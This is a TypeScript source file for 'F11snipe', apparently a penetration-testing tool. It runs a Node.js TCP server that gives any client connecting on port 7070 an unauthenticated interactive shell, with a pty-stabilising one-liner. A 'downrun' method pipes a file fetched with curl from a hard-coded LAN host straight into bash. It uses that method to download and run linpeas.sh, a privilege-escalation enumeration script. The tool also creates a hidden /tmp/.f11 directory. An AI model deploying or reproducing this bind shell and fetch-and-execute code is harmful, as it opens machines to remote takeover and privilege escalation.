// Imports
import colors from 'colors/safe';
import { spawn, execSync, spawnSync, ChildProcessWithoutNullStreams } from 'child_process';
import os from 'os';
import fs from 'fs';
import net from 'net';
import tty, { ReadStream, WriteStream } from 'tty';
import stream, { Duplex, Readable, Writable } from 'stream';

const WEB_HOST = 'http://192.168.1.67:8000';
const UNIX_SHELLS = ['zsh', 'bash', 'sh'];
const UNIX_DEFAULT = 'bin/sh';
const TMP_DIR = `/tmp/.f11`;

// Constants
const NEWLINE = `\r\n`;
const PROMPT = colors.blue('snipe>') + colors.reset(' ');
const PORT = 7070;
const HOST = '0.0.0.0';
const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
// Create net tcp server
const server = net.createServer();
// Define empty array of SnipeSocket[] to track open connections
const sockets: SnipeSocket[] = [];
const timestamp = (): string => new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');

type msgType = 'ok' | 'good' | 'warn' | 'info' | 'debug' | 'error' | 'fatal';

colors.setTheme({
  ok: ['green'],
  good: ['green'],
  warn: ['yellow'],
  info: ['black', 'bgCyan'],
  debug: ['dim', 'cyan', 'italic'],
  error: ['red', 'underline'],
  fatal: ['white', 'bgRed', 'bold']
});

const log = (...args) => console.log( colors.gray(timestamp()), ...args);
const msg = (theme: msgType, body: string, plain?: string) => {
  log(colors[theme](body));
  if (plain) log(plain);
};
const isMac = (): boolean => /darwin/i.test(os.platform());
const isLinux = (): boolean => /linux/i.test(os.platform());
const isWindows = (): boolean => /win/i.test(os.platform());
const isNotWindows = (): boolean => !isWindows();
const findWinShell = (): string => 'cmd.exe'; // LOL F*#K WINDOWS
const findNixShell = (): string => {
  for (let i = 0; i <  UNIX_SHELLS.length; i++) {
    const shell = UNIX_SHELLS[i];
    const check = spawnSync('which', [shell]);

    if (check.status === 0) {
      const found = check.stdout.toString().trim();
      msg('debug', `Using shell: '${shell}' -> ${found}`);
      return found;
    } else {
      msg('warn', `Unable to find shell: '${shell}'`);

      if (i < UNIX_SHELLS.length - 1) {
        msg('debug', `Trying next shell: ${UNIX_DEFAULT[i+1]} ...`);
      }
    }
  }

  // Return default shell "bin/sh"
  return UNIX_DEFAULT;
}

const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();

class SnipeSocket {
  public sock: net.Socket;
  public cp: ChildProcessWithoutNullStreams;
  public inShell = false;
  public inSpawn = false;

  constructor (socket: net.Socket) {
    this.sock = socket;

    fs.mkdirSync(TMP_DIR, { recursive: true });
  }

  public get sig(): string {
    return `${this.sock.remoteAddress}:${this.sock.remotePort}`
  }

  public downrun(file: string, cb?: Function): void {
    const url = `${WEB_HOST}/${file}`;
    const args = [ '-c', `curl -sSL ${url} | bash` ];

    this.spawn('/bin/sh', args, false, (code) => {
      msg('info', `[downrun] Child process exited with code ${code}`);
    });
  }

  public prompt(): void {
    this.sock.write(`${NEWLINE}${PROMPT}`);
  }

  public welcome(): void {
    if (fs.existsSync('msgs/welcome.txt')) this.sock.write(colors.blue(fs.readFileSync('msgs/welcome.txt').toString()));

    this.prompt();
  }

  public spawn (cmd: string, args?: string[], stable?: boolean, cb?: (code: number | null) => void) {
    this.inSpawn = true;
    this.cp = spawn(cmd, args);
    if (stable) this.cp.stdin.write(`${STABALIZE}${NEWLINE}`);
    this.sock.pipe(this.cp.stdin);
    this.cp.stdout.pipe(this.sock);
    this.cp.stderr.pipe(this.sock);

    // What about no out?? on enter?
    this.cp.on('close', (code) => {
      msg('debug', `Child process exited with code ${code}`);
      this.inSpawn = false;

      if (cb) cb(code);
    });
  }

  public shell() {
    this.inShell = true;
    this.spawn(findShell(), [], true, (code) => {
      msg('info', `[shell] Child process exited with code ${code}`);
      this.inShell = false;
    });
  }

  public linpeas() {
    this.downrun('linpeas.sh', () => {
      this.prompt();
    });
  }

  public handle(data: Buffer) {
    msg('info', `Handle socket data: ${data}`);

    const cmd = data.toString().trim();

    if (/^shell$/i.test(cmd)) {
      this.shell();
    } else if (/^linpeas(\.sh)?$/i.test(cmd)) {
      this.linpeas();
    } else if (!this.inShell) {
      this.sock.write(`Command coming soon: ${cmd}`);
    }

    if (!this.inShell) this.prompt();
  }
}

// Intialize and listen for connections
server.listen(PORT, HOST, () => {
  msg('good', `F11snipe Server Started!`);
  msg('good', `Listening: ${HOST}:${PORT}`);
  msg('good', `SHELL: ${findShell()}`)
});

// Main handler for new connections
server.on('connection', (sock: net.Socket) => {
  const socket = new SnipeSocket(sock);
  sockets.push(socket);

  msg('info', `[${socket.sig}] New Connection`);

  try {
    socket.welcome();

    socket.sock.on('data', socket.handle.bind(socket));

    socket.sock.on('close', (hadError: boolean) => {
      if (hadError) log(`Socket.on(close) with error!`);
      let idx = sockets.findIndex((sock) => sock.sig === socket.sig);
      if (idx >= 0) {
        sockets.splice(idx, 1);
      }

      msg('info', `[${socket.sig}] Closed Connection`);
    });
  } catch (err: any) {
    msg('fatal', `Caught connection error: ${err.message}`);
  }
});
